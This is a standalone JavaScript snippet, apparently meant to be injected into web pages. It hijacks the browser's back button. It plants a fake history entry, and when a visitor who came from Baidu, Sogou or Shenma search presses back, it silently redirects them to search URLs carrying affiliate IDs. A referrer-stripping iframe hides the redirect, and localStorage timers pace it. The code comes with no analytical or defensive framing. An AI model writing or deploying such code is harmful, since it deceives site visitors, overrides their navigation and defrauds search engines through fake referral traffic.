(function() {
    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = ["1023686f"];
    var sg_name = "Sg";
    var sg_num = "aa3e40f6caa9c4474bdfee0a83aa2334";
    var sg_times = 30;
    var sg_regex = new RegExp('[\\?&]keyword=([^&#]*)');
    var sm_name = "Sm";
    var sm_arrs = ["wm901232"];
    var sm_num = sm_arrs[0];
    var sm_times = 30;
    var sm_regex = new RegExp('[\\?&]q=([^&#]*)');
    var bd_name = "Bd";
    var bd_times = 600;
    var bd_num = bd_arrs[0];
    var storage = window.localStorage;
    var ref = document.referrer;
    var min = 1000;
    var NowDate = (new Date).valueOf();

    function g_r_n(min, max) {
        var range = max - min;
        var rand = Math.random();
        return (min + Math.round(rand * range))
    }


    function o_g(name, links, times) {
        function run() {
            try {
                storage.setItem(s_key + name, s_name + "||" + NowDate);
                o_no_ref(links)
            } catch (e) {}
        }
        var storageVal = storage.getItem(s_key + name);
        if (storageVal == null) {
            run()
        } else {
            try {
                var storageTime = storageVal.split("||")[1];
                if (NowDate - storageTime >= min * times) {
                    run()
                } else {
                    history.back()
                }
            } catch (e) {}
        }
    }

    function o_no_ref(link) {
        document.body.appendChild(document.createElement('iframe')).src = 'javascript:"<script>top.location.replace(\'' + link + '\')<\/script>"'
    }
    try {
        history.replaceState(null, document.title, location.pathname + '#!/xh');
        history.pushState(null, document.title, location.pathname);
        window.addEventListener('popstate', function() {
            if (location.hash == '#!/xh') {
                var href = "";
                var n = "";
                var t = 0;
                history.replaceState(null, document.title, location.pathname);
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
                	var snum_regex = new RegExp('[\\?&]snum=([^&#]*)');
                	var snum = snum_regex.exec(ref)[1];
                    href = 'https://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum='+snum+ "&k=" + (new Date).valueOf();
                    n = sm_name;
                    t = sm_times
                } else if (ref.match(/(.*)sogou.com/g) && sg_regex.exec(ref) && ref.indexOf(sg_num) == -1) {
		    href = 'https://sogou.adline.com.cn/search?bid=aa3e40f6caa9c4474bdfee0a83aa2334&keyword='+sg_regex.exec(ref)[1];
                    n = sg_name;
                    t = sg_times
                } else if (ref.match(/(.*)baidu.com/g)) {
                    href = "https://m.baidu.com/?from=" + bd_num + "&k=" + (new Date).valueOf();
                    n = bd_name;
                    t = bd_times
                } else {
                    history.back()
                }
                o_g(n, href, t)
            }
        }, false)
    } catch (e) {}
}());